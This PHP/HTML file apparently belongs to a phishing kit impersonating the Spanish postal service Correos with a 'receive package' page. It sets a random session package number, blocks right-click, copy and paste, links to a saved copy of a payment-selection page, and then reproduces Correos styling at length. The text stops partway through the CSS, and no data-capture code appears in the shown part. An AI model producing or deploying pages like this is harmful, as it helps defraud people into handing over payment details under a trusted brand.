<?php

error_reporting();
session_start();
$random = rand(1000000, 9999999);
$_SESSION["Package"]   = $random;

?>

<!DOCTYPE html>
<html class="hydrated" style="position: relative; min-height: 64px;" lang="es" oncontextmenu="return false;" onselectstart="return false" ondrag="return false" ondrop="return false" onpaste="return false;" oncopy="return false;" oncut="return false;">

<head>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta charset="UTF-8">
	<link rel="stylesheet" type="text/css" href="Seleccione%20medio%20de%20pago_fichiers/main.css">

	<title>Correos | Recibir Paquete</title>
	<meta name="template" content="home">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<script async="" src="assets/recibir_paquete_files/gtm.js"></script>

	<meta name="description" content="Localiza tu envío, una oficina o cualquier código postal. Información sobre todos nuestros productos y servicios. Contratación online. ">
	<meta name="robots" content="index,follow">
	<style>
		.sc-correos-cdk-section-box-h {
			--_background-color: var(--cdk-section-box-background-color, magenta);
			--_section-box-padding-top-desktop-sm: var(--section-box-padding-top-desktop-sm, 2.5rem);
			--_section-box-padding-bottom-desktop-sm: var(--section-box-padding-bottom-desktop-sm, 2.5rem);
			--_section-box-padding-top-mobile-tablet-sm: var(--section-box-padding-top-mobile-tablet-sm, 1.5rem);
			--_section-box-padding-bottom-mobile-tablet-sm: var(--section-box-padding-bottom-mobile-tablet-sm, 1.5rem);
			--_section-box-padding-top-desktop-lg: var(--section-box-padding-top-desktop-lg, 5rem);
			--_section-box-padding-bottom-desktop-lg: var(--section-box-padding-bottom-desktop-lg, 5rem);
			--_section-box-padding-top-mobile-tablet-lg: var(--section-box-padding-top-mobile-tablet-lg, 2.5rem);
			--_section-box-padding-bottom-mobile-tablet-lg: var(--section-box-padding-bottom-mobile-tablet-lg, 2.5rem)
		}

		.sc-correos-cdk-section-box-h {
			background-color: var(--_background-color);
			display: block;
			padding: 0
		}

		[variant=smpadding].sc-correos-cdk-section-box-h>.cdk-content.sc-correos-cdk-section-box {
			padding-top: var(--_section-box-padding-top-mobile-tablet-sm);
			padding-bottom: var(--_section-box-padding-bottom-mobile-tablet-sm)
		}

		@media (min-width: 1024px) {
			[variant=smpadding].sc-correos-cdk-section-box-h>.cdk-content.sc-correos-cdk-section-box {
				padding-top: var(--_section-box-padding-top-desktop-sm);
				padding-bottom: var(--_section-box-padding-bottom-desktop-sm)
			}
		}

		[variant=lgpadding].sc-correos-cdk-section-box-h>.cdk-content.sc-correos-cdk-section-box {
			padding-top: var(--_section-box-padding-top-mobile-tablet-lg);
			padding-bottom: var(--_section-box-padding-bottom-mobile-tablet-lg)
		}

		@media (min-width: 1024px) {
			[variant=lgpadding].sc-correos-cdk-section-box-h>.cdk-content.sc-correos-cdk-section-box {
				padding-top: var(--_section-box-padding-top-desktop-lg);
				padding-bottom: var(--_section-box-padding-bottom-desktop-lg)
			}
		}

		.sc-correos-cdk-section-box-h .sc-correos-cdk-section-box.sc-correos-cdk-section-box .sc-correos-cdk-section-box.sc-correos-cdk-section-box .wrapper-main.sc-correos-cdk-section-box {
			padding-left: 0;
			padding-right: 0;
			max-width: none;
			margin-left: unset;
			margin-right: unset
		}
	</style>
	<style>
		@charset "UTF-8";

		.sc-correos-cdk-section-text-img-h {
			--_cdk-section-text-img-background-color: var(--cdk-section-text-img-background-color, white)
		}

		.sc-correos-cdk-section-text-img-h {
			display: block
		}

		.cdk-container.sc-correos-cdk-section-text-img-h {
			padding: 40px 0
		}

		.cdk-container--none-p.sc-correos-cdk-section-text-img-h {
			padding: 0
		}

		.cdk-container--box-shadow.sc-correos-cdk-section-text-img-h {
			-webkit-box-shadow: 0 10px 20px 0 rgba(0, 0, 0, 0.1);
			box-shadow: 0 10px 20px 0 rgba(0, 0, 0, 0.1)
		}

		.cdk-container--border.sc-correos-cdk-section-text-img-h {
			border: 1px solid #cbcbcb;
			border-radius: 8px
		}

		@media (max-width: 639px) {
			.cdk-container--border.sc-correos-cdk-section-text-img-h {
				padding: 16px
			}
		}

		@media (min-width: 640px) {
			.cdk-container.sc-correos-cdk-section-text-img-h {
				padding: 80px 0
			}

			.cdk-container--extra-p.sc-correos-cdk-section-text-img-h {
				padding: 80px 0
			}

			.cdk-container--none-p.sc-correos-cdk-section-text-img-h {
				padding: 0
			}
		}

		@media (min-width: 1024px) {
			.cdk-container.sc-correos-cdk-section-text-img-h {
				padding: 80px 0
			}

			.cdk-container--extra-p.sc-correos-cdk-section-text-img-h {
				padding: 80px 0
			}

			.cdk-container--none-p.sc-correos-cdk-section-text-img-h {
				padding: 0
			}
		}

		.sc-correos-cdk-section-text-img-h .cdk-text-module.sc-correos-cdk-section-text-img {
			-ms-flex-order: 2;
			order: 2;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-section-text-img-h .cdk-text-module.sc-correos-cdk-section-text-img {
				padding-left: 10%;
				-ms-flex-order: 1;
				order: 1
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-section-text-img-h .cdk-text-module.sc-correos-cdk-section-text-img {
				padding-left: 10%;
				-ms-flex-order: 1;
				order: 1;
				display: block
			}
		}

		.sc-correos-cdk-section-text-img-h .cdk-img-module.sc-correos-cdk-section-text-img {
			padding: 16px 40px;
			-ms-flex-order: 1;
			order: 1
		}

		.sc-correos-cdk-section-text-img-h .cdk-img-module--opacity.sc-correos-cdk-section-text-img-s>[slot=img] img {
			opacity: 20%
		}

		@media (max-width: 639px) {
			.sc-correos-cdk-section-text-img-h .cdk-img-module--hide-mobile.sc-correos-cdk-section-text-img {
				display: none
			}
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-section-text-img-h .cdk-img-module.sc-correos-cdk-section-text-img {
				-ms-flex-order: 2;
				order: 2;
				padding: 0 24px
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-section-text-img-h .cdk-img-module.sc-correos-cdk-section-text-img {
				-ms-flex-order: 2;
				order: 2;
				padding: 0 32px
			}
		}

		@media (min-width: 640px) {
			[distribution=reverse].sc-correos-cdk-section-text-img-h .cdk-text-module.sc-correos-cdk-section-text-img {
				-ms-flex-order: 2;
				order: 2;
				padding-left: 0;
				padding-right: 10%
			}

			[distribution=reverse].sc-correos-cdk-section-text-img-h .cdk-img-module.sc-correos-cdk-section-text-img {
				-ms-flex-order: 1;
				order: 1
			}
		}

		@media (min-width: 1024px) {
			[distribution=reverse].sc-correos-cdk-section-text-img-h .cdk-text-module.sc-correos-cdk-section-text-img {
				-ms-flex-order: 2;
				order: 2;
				padding-right: 10%;
				padding-left: 0;
				display: block
			}

			[distribution=reverse].sc-correos-cdk-section-text-img-h .cdk-img-module.sc-correos-cdk-section-text-img {
				-ms-flex-order: 1;
				order: 1
			}
		}
	</style>
	<style>
		.sc-correos-ui-plain-text-h {
			--_ui-plaintext-color-icon: var(--ui-plaintext-color-icon, blue);
			--_ui-plaintext-color-text: var(--ui-plaintext-color-text, yellow);
			--_ui-plaintext-color-bg: var(--ui-plaintext-color-bg, red)
		}

		.sc-correos-ui-plain-text-h {
			--_ui-plain-text-color: var(--ui-plain-text-color, var(--theme-color-strongGrey, magenta));
			--_ui-plain-text-link-color: var(--ui-plain-text-link-color, green);
			--_ui-plain-text-link-decoration: var(--ui-plain-text-link-decoration, none);
			--_ui-plain-text-link-font-weight: var(--ui-plain-text-link-font-weight, bold);
			--_ui-plain-text-font-weight: var(--ui-plain-text-font-weight, 400);
			--_ui-plain-text-text-align: var(--ui-plain-text-text-align, initial);
			display: block;
			width: 100%
		}

		.sc-correos-ui-plain-text-h .ui-container.sc-correos-ui-plain-text {
			color: var(--_ui-plain-text-color);
			text-align: var(--_ui-plain-text-text-align);
			-ms-flex-pack: center;
			justify-content: center
		}

		.sc-correos-ui-plain-text-h .--max-width.sc-correos-ui-plain-text {
			max-width: 864px
		}

		.sc-correos-ui-plain-text-h .active-margin.sc-correos-ui-plain-text {
			margin-bottom: 16px
		}

		@media (min-width: 640px) {
			.sc-correos-ui-plain-text-h .active-margin.sc-correos-ui-plain-text {
				margin-bottom: 24px
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-plain-text-h .active-margin.sc-correos-ui-plain-text {
				margin-bottom: 24px
			}
		}

		.sc-correos-ui-plain-text-h correos-ui-button.sc-correos-ui-plain-text {
			display: none
		}

		@media (max-width: 639px) {
			.sc-correos-ui-plain-text-h .button-wrapper.sc-correos-ui-plain-text {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: center;
				justify-content: center
			}

			.sc-correos-ui-plain-text-h correos-ui-button.sc-correos-ui-plain-text {
				display: inline
			}

			.sc-correos-ui-plain-text-h .content-body.sc-correos-ui-plain-text {
				max-height: 240px
			}

			.sc-correos-ui-plain-text-h .overflow-gradient.sc-correos-ui-plain-text {
				overflow: hidden;
				position: relative
			}

			.sc-correos-ui-plain-text-h .overflow-gradient.sc-correos-ui-plain-text:before {
				content: "";
				position: absolute;
				width: 100%;
				height: 80px;
				background: -webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(var(--_ui-plaintext-color-bg)));
				background: linear-gradient(180deg, rgba(255, 255, 255, 0) 0%, var(--_ui-plaintext-color-bg) 100%);
				bottom: 0
			}
		}

		@media (max-width: 639px) and (min-width: 640px) {
			.sc-correos-ui-plain-text-h .overflow-gradient.sc-correos-ui-plain-text:before {
				height: 104px
			}
		}

		@media (max-width: 639px) and (min-width: 1024px) {
			.sc-correos-ui-plain-text-h .overflow-gradient.sc-correos-ui-plain-text:before {
				height: 104px
			}
		}

		@media (max-width: 639px) {
			.sc-correos-ui-plain-text-h .overflow-gradient.open.sc-correos-ui-plain-text {
				max-height: 100%;
				overflow: auto
			}

			.sc-correos-ui-plain-text-h .overflow-gradient.open.sc-correos-ui-plain-text:before {
				display: none
			}
		}

		.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext] {
			font-weight: var(--_ui-plain-text-font-weight)
		}

		.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext]>ul {
			list-style: none
		}

		.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext]>ul>li {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			font-size: 0.875rem;
			line-height: 1.375rem;
			color: var(--_ui-plaintext-color-text);
			margin-bottom: 16px
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext]>ul>li {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext]>ul>li i.icon-bullet_circle {
			display: inline-block;
			vertical-align: middle;
			font-size: 16px;
			color: var(--_ui-plaintext-color-icon);
			margin-right: 16px
		}

		.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext]>ul>li ul {
			list-style: none
		}

		.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext]>ol {
			list-style: none;
			counter-reset: li
		}

		.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext]>ol li {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			font-size: 0.875rem;
			line-height: 1.375rem;
			counter-increment: li;
			color: var(--_ui-plaintext-color-text)
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext]>ol li {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext]>ol li::before {
			content: counter(li) ".";
			color: var(--_ui-plaintext-color-icon);
			font-size: 16px;
			margin-right: 24px;
			vertical-align: top
		}

		.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext] a {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			color: initial;
			text-decoration: none;
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			font-size: 0.875rem;
			line-height: 1.375rem;
			font-weight: bold;
			color: var(--_ui-plain-text-link-color);
			-webkit-text-decoration: var(--_ui-plain-text-link-decoration);
			text-decoration: var(--_ui-plain-text-link-decoration);
			font-weight: var(--_ui-plain-text-link-font-weight);
			text-decoration: underline
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext] a {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext] p {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			font-size: 0.875rem;
			line-height: 1.375rem;
			margin-bottom: 24px
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext] p {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext] p:last-child {
			margin-bottom: 0
		}

		.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext] correos-ui-button {
			margin-bottom: 24px
		}

		.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext] correos-ui-button:last-child {
			margin-bottom: 0
		}

		.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext] correos-ui-button a {
			text-decoration: none
		}

		.sc-correos-ui-plain-text-h[variant=light-text] .sc-correos-ui-plain-text-s>[slot=plaintext] {
			font-weight: 300
		}

		[variant=text-collapse-desktop].sc-correos-ui-plain-text-h .button-wrapper.sc-correos-ui-plain-text {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-pack: center;
			justify-content: center
		}

		[variant=text-collapse-desktop].sc-correos-ui-plain-text-h correos-ui-button.sc-correos-ui-plain-text {
			display: inline
		}

		[variant=text-collapse-desktop].sc-correos-ui-plain-text-h .content-body.sc-correos-ui-plain-text {
			max-height: 432px
		}

		@media (min-width: 640px) {
			[variant=text-collapse-desktop].sc-correos-ui-plain-text-h .content-body.sc-correos-ui-plain-text {
				max-height: 432px
			}
		}

		@media (min-width: 1024px) {
			[variant=text-collapse-desktop].sc-correos-ui-plain-text-h .content-body.sc-correos-ui-plain-text {
				max-height: 432px
			}
		}

		[variant=text-collapse-desktop].sc-correos-ui-plain-text-h .overflow-gradient.sc-correos-ui-plain-text {
			overflow: hidden;
			position: relative
		}

		[variant=text-collapse-desktop].sc-correos-ui-plain-text-h .overflow-gradient.sc-correos-ui-plain-text:before {
			content: "";
			position: absolute;
			width: 100%;
			height: 80px;
			background: -webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(var(--_ui-plaintext-color-bg)));
			background: linear-gradient(180deg, rgba(255, 255, 255, 0) 0%, var(--_ui-plaintext-color-bg) 100%);
			bottom: 0
		}

		@media (min-width: 640px) {
			[variant=text-collapse-desktop].sc-correos-ui-plain-text-h .overflow-gradient.sc-correos-ui-plain-text:before {
				height: 104px
			}
		}

		@media (min-width: 1024px) {
			[variant=text-collapse-desktop].sc-correos-ui-plain-text-h .overflow-gradient.sc-correos-ui-plain-text:before {
				height: 104px
			}
		}

		[variant=text-collapse-desktop].sc-correos-ui-plain-text-h .overflow-gradient.open.sc-correos-ui-plain-text {
			max-height: 100%;
			overflow: auto
		}

		[variant=text-collapse-desktop].sc-correos-ui-plain-text-h .overflow-gradient.open.sc-correos-ui-plain-text:before {
			display: none
		}
	</style>
	<style>
		.sc-correos-cdk-full-content-photo-h {
			--_cdk-full-content-photo-bg-color-textblock: var(--cdk-full-content-photo-bg-color-textblock, #ffffff);
			--_cdk-full-content-photo-border-textblock: var(--cdk-full-content-photo-border-color-textblock, #cbcbcb);
			--_cdk-full-content-photo-box-shadow-textblock: 0 10px 20px 0 rgba(0, 0, 0, 0.1);
			--_wrapper: var(--cdk-full-content-photo-layout-wrapper, 1366)
		}

		.sc-correos-cdk-full-content-photo-h {
			display: block;
			margin-left: 24px;
			width: calc(100% - 48px);
			position: relative;
			padding: 40px 0
		}

		.sc-correos-cdk-full-content-photo-h .cdk-textblock.sc-correos-cdk-full-content-photo {
			border: 1px solid var(--_cdk-full-content-photo-border-textblock);
			border-radius: 8px;
			background-color: var(--_cdk-full-content-photo-bg-color-textblock);
			-webkit-box-shadow: var(--_cdk-full-content-photo-box-shadow-textblock);
			box-shadow: var(--_cdk-full-content-photo-box-shadow-textblock);
			padding: 24px 16px
		}

		.sc-correos-cdk-full-content-photo-h .cdk-decorator.sc-correos-cdk-full-content-photo {
			display: none
		}

		.sc-correos-cdk-full-content-photo-h .cdk-figure.sc-correos-cdk-full-content-photo {
			margin: 0;
			padding: 0;
			border: 0;
			font-size: 100%;
			font: inherit;
			vertical-align: baseline
		}

		.sc-correos-cdk-full-content-photo-h .sc-correos-cdk-full-content-photo-s>[slot=subtext] {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			padding: 17px;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-pack: center;
			justify-content: center;
			color: #333333;
			display: flex;
			-ms-flex-pack: start;
			justify-content: flex-start;
			font-size: 0.75rem;
			line-height: 1.175rem;
			font-weight: 300;
			width: 100%
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-full-content-photo-h .sc-correos-cdk-full-content-photo-s>[slot=subtext] {
				font-size: 0.875rem;
				line-height: 1.25rem
			}
		}

		[size=sm].sc-correos-cdk-full-content-photo-h .cdk-textblock.sc-correos-cdk-full-content-photo {
			padding: 24px 10%
		}

		.sc-correos-cdk-full-content-photo-h[size=sm] .sc-correos-cdk-full-content-photo-s>[slot=subtext] {
			padding: 32px
		}

		[size=md].sc-correos-cdk-full-content-photo-h,
		[size=lg].sc-correos-cdk-full-content-photo-h {
			width: 100%;
			display: -ms-flexbox;
			display: flex;
			margin-left: 0
		}

		[size=md].sc-correos-cdk-full-content-photo-h .cdk-img.sc-correos-cdk-full-content-photo,
		[size=lg].sc-correos-cdk-full-content-photo-h .cdk-img.sc-correos-cdk-full-content-photo {
			background-repeat: no-repeat;
			background-size: cover;
			background-position: center center;
			-ms-flex: 1 1 50%;
			flex: 1 1 50%;
			border-radius: 8px
		}

		[size=md].sc-correos-cdk-full-content-photo-h .cdk-content.sc-correos-cdk-full-content-photo,
		[size=lg].sc-correos-cdk-full-content-photo-h .cdk-content.sc-correos-cdk-full-content-photo {
			-ms-flex: 1 1 50%;
			flex: 1 1 50%;
			padding-bottom: 3rem
		}

		[size=md].sc-correos-cdk-full-content-photo-h .cdk-textblock.sc-correos-cdk-full-content-photo,
		[size=lg].sc-correos-cdk-full-content-photo-h .cdk-textblock.sc-correos-cdk-full-content-photo {
			width: calc(100% + 7rem - 24px);
			height: 100%;
			max-width: calc(var(--_wrapper) / 2 + 7rem - 24px);
			position: relative;
			left: -7rem;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center;
			-webkit-box-sizing: border-box;
			box-sizing: border-box
		}

		.sc-correos-cdk-full-content-photo-h[size=md] .sc-correos-cdk-full-content-photo-s>[slot=textblock],
		.sc-correos-cdk-full-content-photo-h[size=lg] .sc-correos-cdk-full-content-photo-s>[slot=textblock] {
			max-width: 40rem;
			width: 100%;
			margin-left: auto;
			margin-right: auto
		}

		[size=md].sc-correos-cdk-full-content-photo-h .cdk-textblock.sc-correos-cdk-full-content-photo {
			padding: 24px 15%
		}

		.sc-correos-cdk-full-content-photo-h[size=md] .sc-correos-cdk-full-content-photo-s>[slot=subtext] {
			width: 80%
		}

		[size=lg].sc-correos-cdk-full-content-photo-h {
			padding: 0
		}

		[size=lg].sc-correos-cdk-full-content-photo-h .cdk-textblock.sc-correos-cdk-full-content-photo {
			max-width: calc(var(--_wrapper) / 2 + 9rem - 24px);
			width: calc(100% + 9rem - 24px);
			left: -9rem;
			padding: 48px min(15%, 48px)
		}

		[size=lg].sc-correos-cdk-full-content-photo-h .cdk-content.sc-correos-cdk-full-content-photo {
			padding-bottom: 4.6rem
		}

		[size=lg].sc-correos-cdk-full-content-photo-h .cdk-decorator.sc-correos-cdk-full-content-photo {
			display: block;
			position: absolute;
			bottom: -4.5rem;
			right: -19rem;
			pointer-events: none
		}

		.sc-correos-cdk-full-content-photo-h[size=lg] .sc-correos-cdk-full-content-photo-s>[slot=subtext] {
			width: 60%
		}

		[content-padding=false].sc-correos-cdk-full-content-photo-h .cdk-textblock.sc-correos-cdk-full-content-photo {
			padding: 0
		}

		.sc-correos-cdk-full-content-photo-h[content-padding=false] .sc-correos-cdk-full-content-photo-s>[slot=textblock] {
			max-width: unset;
			margin: 0
		}

		[theme=inverse].sc-correos-cdk-full-content-photo-h {
			-ms-flex-direction: row-reverse;
			flex-direction: row-reverse;
			padding-left: calc((100% - var(--_wrapper)) / 2);
			width: calc(100% - 48px)
		}

		[theme=inverse][size=md].sc-correos-cdk-full-content-photo-h,
		[theme=inverse][size=lg].sc-correos-cdk-full-content-photo-h {
			width: 100%
		}

		[theme=inverse][size=md].sc-correos-cdk-full-content-photo-h .cdk-textblock.sc-correos-cdk-full-content-photo,
		[theme=inverse][size=lg].sc-correos-cdk-full-content-photo-h .cdk-textblock.sc-correos-cdk-full-content-photo {
			left: 0rem;
			width: 124%
		}

		.sc-correos-cdk-full-content-photo-h[theme=inverse][size=md] .sc-correos-cdk-full-content-photo-s>[slot=subtext],
		.sc-correos-cdk-full-content-photo-h[theme=inverse][size=lg] .sc-correos-cdk-full-content-photo-s>[slot=subtext] {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-pack: end;
			justify-content: flex-end
		}

		[theme=inverse][size=lg].sc-correos-cdk-full-content-photo-h .cdk-textblock.sc-correos-cdk-full-content-photo {
			max-width: none
		}

		[theme=inverse][size=lg][variant=with-decorator].sc-correos-cdk-full-content-photo-h .cdk-decorator.sc-correos-cdk-full-content-photo {
			left: -19rem
		}
	</style>
	<style>
		@charset "UTF-8";

		.sc-correos-cdk-section-automatic-responsive-h {
			--_cdk-section-automatic-responsive-background-color: var(--cdk-section-automatic-responsive-background-color, white)
		}

		.sc-correos-cdk-section-automatic-responsive-h {
			display: block
		}

		.sc-correos-cdk-section-automatic-responsive-h .with-margin-bottom.sc-correos-cdk-section-automatic-responsive {
			margin-bottom: 16px
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-section-automatic-responsive-h .with-margin-bottom.sc-correos-cdk-section-automatic-responsive {
				margin-bottom: 32px
			}
		}

		@media only screen and (max-width: 420px) {
			#slotext {
				-ms-flex-direction: column;
				flex-direction: column;
			}

			#slotext>p {
				font-size: 9px;
			}
		}

		.sc-correos-cdk-section-automatic-responsive-h .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			display: grid;
			width: 100%;
			grid-row-gap: 16px;
			grid-column-gap: 16px
		}

		.sc-correos-cdk-section-automatic-responsive-h[size=lg] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			grid-row-gap: 32px;
			grid-column-gap: 32px
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-1-1"] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			grid-template-columns: 100%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-1-2"] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 32px);
			grid-template-columns: 50% 50%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-1-2"][size=sm] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: 100%;
			grid-template-columns: 100%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-1-2"][size=md] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: 100%;
			grid-template-columns: 100%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-2-2"] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: 100%;
			grid-template-columns: 100%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-2-2"][size=md] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 16px);
			grid-template-columns: 50% 50%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-2-2"][size=lg] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 32px);
			grid-template-columns: 50% 50%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-2-2(70-30)"] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: 100%;
			grid-template-columns: 100%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-2-2(70-30)"][size=md] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 16px);
			grid-template-columns: 50% 50%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-2-2(70-30)"][size=lg] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 64px);
			grid-template-columns: calc(66.66% + 32px) 33.33%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-2-2(30-70)"] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: 100%;
			grid-template-columns: 100%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-2-2(30-70)"][size=md] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 16px);
			grid-template-columns: 50% 50%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-2-2(30-70)"][size=lg] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 64px);
			grid-template-columns: 33.33% calc(66.66% + 32px)
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-2-3"] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			grid-template-columns: 100%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-2-3"][size=md] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 16px);
			grid-template-columns: 50% 50%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-2-3"][size=lg] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 64px);
			grid-template-columns: 33.3% 33.3% 33.3%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-2-4"] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			grid-template-columns: 100%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-2-4"][size=md] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 16px);
			grid-template-columns: 50% 50%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-2-4"][size=lg] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 96px);
			grid-template-columns: 25% 25% 25% 25%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-3-4"] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			grid-template-columns: 100%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-3-4"][size=md] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 26px);
			grid-template-columns: 33% 33% 33%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-3-4"][size=lg] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 96px);
			grid-template-columns: 25% 25% 25% 25%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-3-3"] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: 100%;
			grid-template-columns: 100%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-3-3"][size=md] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 32px);
			grid-template-columns: 33.33% 33.33% 33.33%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-3-3"][size=lg] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 64px);
			grid-template-columns: 33.33% 33.33% 33.33%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-3-6"] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			grid-template-columns: 100%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-3-6"][size=md] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 32px);
			grid-template-columns: 33.33% 33.33% 33.33%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="1-3-6"][size=lg] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 160px);
			grid-template-columns: 16.66% 16.66% 16.66% 16.66% 16.66% 16.66%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="2-4-4"] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 8px);
			grid-template-columns: 50% 50%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="2-4-4"][size=md] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 48px);
			grid-template-columns: 25% 25% 25% 25%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="2-4-4"][size=lg] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 96px);
			grid-template-columns: 25% 25% 25% 25%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="2-4-6"] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 8px);
			grid-template-columns: 50% 50%
		}

		.sc-correos-cdk-section-automatic-responsive-h[variant="2-4-6"][size=md] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 48px);
			grid-template-columns: 25% 25% 25% 25%
		}

